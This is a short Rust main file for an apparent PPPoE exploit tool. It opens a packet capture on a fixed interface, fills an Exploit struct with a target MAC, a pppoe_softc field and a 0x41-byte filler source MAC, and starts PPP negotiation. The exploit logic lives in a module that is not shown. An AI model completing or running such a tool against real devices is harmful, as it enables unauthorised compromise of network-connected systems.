mod constants;
mod exploit;
mod macaddress;
use macaddress::MacAddress64;
use pcap::{Capture, Device};

use crate::exploit::Exploit;

fn main() {
    // Cap device
    let interface = "en10";
    // Open the specified interface
    let dev = Device::list()
        .unwrap()
        .into_iter()
        .find(|d| d.name == interface)
        .expect("Specified interface not found");
    let cap = Capture::from_device(dev).unwrap();

    let open_cap = cap.timeout(10000).open().unwrap();

    let mut exploit = Exploit {
        target_mac: MacAddress64::from_u64(0),
        pppoe_softc: 0,
        source_mac: MacAddress64([41, 41, 41, 41, 41, 41, 41, 41]),
        host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
    };

    exploit.ppp_negotiation(open_cap);
}
